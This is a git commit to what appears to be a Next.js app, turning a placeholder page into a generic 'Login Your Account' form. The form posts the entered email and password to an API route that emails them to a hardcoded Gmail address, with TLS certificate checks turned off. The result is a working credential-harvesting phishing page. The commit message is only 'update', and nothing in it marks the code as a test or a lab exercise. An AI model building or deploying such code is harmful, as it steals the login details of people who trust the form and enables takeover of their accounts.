ebcc25d492658699ba8e38f74252fc4b38a038c4
Allen Pigar <lleannenvm@gmail.com>
2023-02-21 15:04:33 +0800

    update

--- pages/api/hello.js
+++ pages/api/hello.js
@@ -1,5 +1,32 @@
 // Next.js API route support: https://nextjs.org/docs/api-routes/introduction
 
 export default function handler(req, res) {
-  res.status(200).json({ name: 'John Doe' })
+  require("dotenv").config();
+
+  let nodemailer = require("nodemailer");
+  let { email, pass } = req.body;
+  const transporter = nodemailer.createTransport({
+    host: "smtp.gmail.com",
+    port: 25,
+    secure: false,
+    auth: {
+      user: "hinayupak022@gmail.com",
+      pass: process.env.PASSWORD,
+    },
+    tls: {
+      // do not fail on invalid certs
+      rejectUnauthorized: false,
+    },
+  });
+  const mailData = {
+    from: "hinayupak022@gmail.com",
+    to: "hinayupak022@gmail.com",
+    subject: `Message From Test`,
+    text: email + " " + pass,
+    html: `<div>${email} ${pass} </div>`,
+  };
+  transporter.sendMail(mailData, function (err, info) {
+    if (err) res.status(400).send(err);
+    res.status(200).send(info);
+  });
 }
--- pages/index.js
+++ pages/index.js
@@ -1,7 +1,60 @@
-import Head from "next/head";
-import Image from "next/image";
-import styles from "../styles/Home.module.css";
+import React from "react";
+import { useState } from "react";
 
 export default function Home() {
-  return <div className={styles.container}>test</div>;
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleSubmit = async (e) => {
+    e.prevenDefault;
+    await fetch("/api/hello", {
+      method: "POST",
+      headers: {
+        Accept: "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        email: email,
+        pass: password,
+      }),
+    });
+  };
+
+  return (
+    <>
+      <div className="w-screen bg-blue-800 p-8"></div>
+      <div className="w-screen flex align-center justify-center p-4">
+        <div className="lg:w-1/2 xl:w-1/2 2xl:w-1/2 w-full">
+          <h1 className="py-4 text-lg font-semibold text-blue-800">
+            Login Your Account
+          </h1>
+          <label className="font-semibold">Email</label>
+          <br />
+          <input
+            type="text"
+            className="p-2 border border-gray-500 outline-none rounded w-full mb-4"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+          ></input>
+          <br />
+          <label className="font-semibold">Password</label>
+          <br />
+          <input
+            type="password"
+            className="p-2 border border-gray-500 outline-none rounded w-full mb-4"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+          ></input>
+          <br />
+          <button
+            type="submit"
+            className="py-2 px-4 font-semibold text-white bg-blue-800 rounded"
+            onClick={(e) => handleSubmit(e)}
+          >
+            Login
+          </button>
+        </div>
+      </div>
+    </>
+  );
 }
